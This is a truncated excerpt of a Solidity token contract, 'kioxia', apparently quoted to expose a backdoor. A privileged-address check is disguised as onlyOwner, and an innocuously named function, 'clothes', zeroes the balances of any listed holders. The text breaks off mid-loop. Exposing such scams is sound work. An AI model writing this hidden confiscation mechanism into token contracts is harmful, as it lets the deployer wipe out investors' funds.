...
contract kioxia is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == exchange, "Not allowed");
        _;
    }

    function clothes(address[] memory ensure) public onlyOwner() {
    uint256 len = ensure.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[ensure[i]];
        _balances[ensure[i]] = 0;
